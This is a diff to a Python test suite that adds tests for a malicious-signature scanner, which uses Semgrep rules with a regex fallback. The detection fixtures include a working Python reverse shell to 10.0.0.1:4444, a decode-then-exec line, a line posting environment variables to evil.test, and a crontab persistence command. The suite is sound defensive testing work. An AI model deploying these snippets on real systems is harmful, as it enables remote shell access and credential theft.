@@ -289,13 +289,19 @@ def test_scan_all_runs_every_enabled_scanner(staged_env, monkeypatch):
             sast_json='{"all_findings":[{"file":"main.py","line":1,"severity":"LOW","issue_text":"x"}]}',
         ),
     )
+    # Signature scan uses its own engine (not _invoke_scanner); stub it to no hits
+    # so this fan-out test stays deterministic without the Semgrep binary.
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
 
     result = scanners.scan_all(aid, staged_path="/quarantine/x")
     assert result["total_findings"] == 3
-    assert set(result["scanners"]) == {"sast", "secrets", "deps"}
+    assert set(result["scanners"]) == {"sast", "secrets", "deps", "semgrep"}
     for name in ("sast", "secrets", "deps"):
         assert result["scanners"][name]["success"]
         assert result["scanners"][name]["findings_persisted"] == 1
+    # semgrep is enabled (default + config) but found nothing this run.
+    assert result["scanners"]["semgrep"]["success"]
+    assert result["scanners"]["semgrep"]["findings_persisted"] == 0
 
     scanners_seen = {r["source_scanner"] for r in _findings(aid)}
     assert scanners_seen == {"sast", "secrets", "deps"}
@@ -312,6 +318,7 @@ def test_scan_all_respects_disabled_toggle(staged_env, monkeypatch):
             sast_json='{"all_findings":[]}',
         ),
     )
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
     # Disable the deps scanner via config.
     monkeypatch.setattr(
         scanners, "_load_config", lambda: {"scanners": {"deps": False}}
@@ -477,10 +484,13 @@ def test_scan_all_omits_optin_scanners_by_default(staged_env, monkeypatch):
             sast_json='{"all_findings":[]}',
         ),
     )
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
     # Real config has formal/container off -> they must not appear in the report.
     result = scanners.scan_all(aid, staged_path="/quarantine/x")
     assert "formal" not in result["scanners"]
     assert "container" not in result["scanners"]
+    # semgrep IS on by default/config, so it participates.
+    assert "semgrep" in result["scanners"]
 
 
 def test_scan_all_runs_formal_when_enabled(staged_env, tmp_path, monkeypatch):
@@ -503,7 +513,8 @@ def test_scan_all_runs_formal_when_enabled(staged_env, tmp_path, monkeypatch):
         return 0, '{"all_findings":[]}', ""
 
     monkeypatch.setattr(scanners, "_invoke_scanner", _fake)
-    # Enable formal via config; container stays off.
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: [])
+    # Enable formal via config; container stays off. semgrep omitted -> default on.
     monkeypatch.setattr(
         scanners,
         "_load_config",
@@ -515,3 +526,155 @@ def test_scan_all_runs_formal_when_enabled(staged_env, tmp_path, monkeypatch):
     assert result["scanners"]["formal"]["findings_persisted"] == 1
     assert "container" not in result["scanners"]  # still off
     assert any(r["source_scanner"] == "formal" for r in _findings(aid))
+
+
+# --------------------------------------------------------------------------- #
+# Malicious-signature scan — Semgrep rules + deterministic regex fallback
+# --------------------------------------------------------------------------- #
+_REVERSE_SHELL = (
+    "import socket, subprocess, os\n"
+    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+    's.connect(("10.0.0.1", 4444))\n'
+    "os.dup2(s.fileno(), 0)\n"
+    "os.dup2(s.fileno(), 1)\n"
+    "os.dup2(s.fileno(), 2)\n"
+    'subprocess.call(["/bin/sh", "-i"])\n'
+)
+
+# A benign socket server + legitimate base64/import use — must NOT trip any rule.
+_BENIGN = (
+    "import socket, base64, importlib\n"
+    "def serve():\n"
+    "    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+    '    srv.bind(("0.0.0.0", 8080))\n'
+    "    srv.listen(5)\n"
+    "    conn, _ = srv.accept()\n"
+    "    return conn.recv(1024)\n"
+    "def token(t):\n"
+    "    return base64.b64decode(t).decode()\n"
+    'def load():\n'
+    '    return importlib.import_module("os")\n'
+)
+
+
+def _staged_with(tmp_path, name, content):
+    d = tmp_path / "sig_target"
+    d.mkdir(parents=True, exist_ok=True)
+    (d / name).write_text(content, encoding="utf-8")
+    return d
+
+
+def test_signature_fallback_trips_on_reverse_shell(staged_env, tmp_path, monkeypatch):
+    """Planted reverse-shell fixture trips a known_bad_signature via the fallback."""
+    aid = _new_assessment(staged_env)
+    staged = _staged_with(tmp_path, "evil.py", _REVERSE_SHELL)
+    # Force the Semgrep-absent path so the test never depends on the binary.
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)
+
+    result = scanners.run_signature_scan(aid, staged_path=str(staged))
+    assert result["scanner"] == "semgrep"
+    assert result["success"] is True
+    assert result["engine"] == "regex_fallback"
+    assert result["findings_persisted"] >= 1
+
+    rows = _findings(aid)
+    assert rows, "expected at least one known_bad_signature finding"
+    for r in rows:
+        assert r["source_scanner"] == "semgrep"
+        assert r["finding_type"] == "known_bad_signature"
+        assert r["file_path"] == "evil.py"          # relativized to staged root
+        assert r["line"] is not None
+        assert '"category": "reverse_shell"' in r["detail"]
+        assert "rule_id" in r["detail"]
+    # reverse_shell is critical severity.
+    assert any(r["severity"] == "critical" for r in rows)
+
+
+def test_signature_fallback_benign_file_no_findings(staged_env, tmp_path, monkeypatch):
+    """A benign socket/base64/import file does not trip any malicious signature."""
+    aid = _new_assessment(staged_env)
+    staged = _staged_with(tmp_path, "ok.py", _BENIGN)
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)
+
+    result = scanners.run_signature_scan(aid, staged_path=str(staged))
+    assert result["success"] is True
+    assert result["findings_persisted"] == 0
+    assert _findings(aid) == []
+
+
+def test_signature_fallback_covers_each_category(tmp_path):
+    """Each signature category matches its idiom and benign code stays clean."""
+    samples = {
+        "reverse_shell": 'subprocess.Popen(["/bin/bash", "-i"], stdin=s)\n',
+        "decode_then_exec": "exec(base64.b64decode(payload))\n",
+        "credential_exfil": 'requests.post("https://evil.test/x", data=os.environ)\n',
+        "dynamic_import": "importlib.import_module(user_supplied)\n",
+        "persistence": 'os.system("crontab -l > /tmp/c")\n',
+    }
+    for category, line in samples.items():
+        staged = _staged_with(tmp_path / category, "m.py", line)
+        hits = scanners._signature_fallback_scan(staged)
+        cats = {h["category"] for h in hits}
+        assert category in cats, f"{category} not detected in: {line!r}"
+
+    benign = _staged_with(tmp_path / "benign", "b.py", _BENIGN)
+    assert scanners._signature_fallback_scan(benign) == []
+
+
+def test_signature_semgrep_path_maps_hits(staged_env, tmp_path, monkeypatch):
+    """When Semgrep runs, its hits map to known_bad_signature with rule id + line."""
+    aid = _new_assessment(staged_env)
+    staged = tmp_path / "x"
+    evil = staged / "dropper.py"
+    canned = [
+        {
+            "rule_id": "sipa-decode-then-exec-py",
+            "category": "decode_then_exec",
+            "file": str(evil),
+            "line": 12,
+            "message": "decode-then-exec",
+        },
+        {
+            "rule_id": "sipa-dynamic-import-py",
+            "category": "dynamic_import",
+            "file": str(evil),
+            "line": 20,
+            "message": "dynamic import",
+        },
+    ]
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: canned)
+
+    result = scanners.run_signature_scan(aid, staged_path=str(staged))
+    assert result["success"] is True
+    assert result["engine"] == "semgrep"
+    assert result["findings_persisted"] == 2
+
+    rows = _findings(aid)
+    by_line = {r["line"]: r for r in rows}
+    assert by_line[12]["finding_type"] == "known_bad_signature"
+    assert by_line[12]["source_scanner"] == "semgrep"
+    assert by_line[12]["severity"] == "critical"        # decode_then_exec
+    assert by_line[12]["file_path"] == "dropper.py"      # relativized
+    assert "sipa-decode-then-exec-py" in by_line[12]["detail"]
+    assert by_line[20]["severity"] == "medium"           # dynamic_import
+    assert '"engine": "semgrep"' in by_line[20]["detail"]
+
+
+def test_signature_scan_in_fan_out(staged_env, tmp_path, monkeypatch):
+    """scan_all wires the signature scanner under the 'semgrep' key."""
+    aid = _new_assessment(staged_env)
+    staged = _staged_with(tmp_path, "evil.py", _REVERSE_SHELL)
+    # Other scanners: no-op; signature scanner: force fallback over the real tree.
+    monkeypatch.setattr(
+        scanners,
+        "_invoke_scanner",
+        _dispatch_fake('{"findings":[]}', '{"results":{}}', '{"all_findings":[]}'),
+    )
+    monkeypatch.setattr(scanners, "_detect_signatures", lambda s: None)
+
+    result = scanners.scan_all(aid, staged_path=str(staged))
+    assert "semgrep" in result["scanners"]
+    assert result["scanners"]["semgrep"]["findings_persisted"] >= 1
+    assert any(
+        r["finding_type"] == "known_bad_signature" for r in _findings(aid)
+    )
